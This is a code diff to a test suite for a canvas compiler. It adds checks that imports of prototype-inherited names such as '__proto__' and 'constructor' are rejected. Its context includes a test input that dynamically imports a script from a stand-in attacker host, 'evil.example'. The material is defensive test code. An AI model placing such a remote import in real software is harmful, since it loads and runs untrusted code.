@@ -152,6 +152,12 @@ describe("the canvas compiler", () => {
       ],
     });
 
+    for (const inherited of ["constructor", "toString", "__proto__", "hasOwnProperty"])
+      expect(
+        await compileCanvas(`import x from "${inherited}";\nexport default () => x;`),
+        inherited,
+      ).toMatchObject({ kind: "failed", errors: [{ file: "main.tsx", line: 1 }] });
+
     const dynamic = await compileCanvas(
       `export default function View() {\n  void import("https://evil.example/x.js");\n  return null;\n}`,
     );
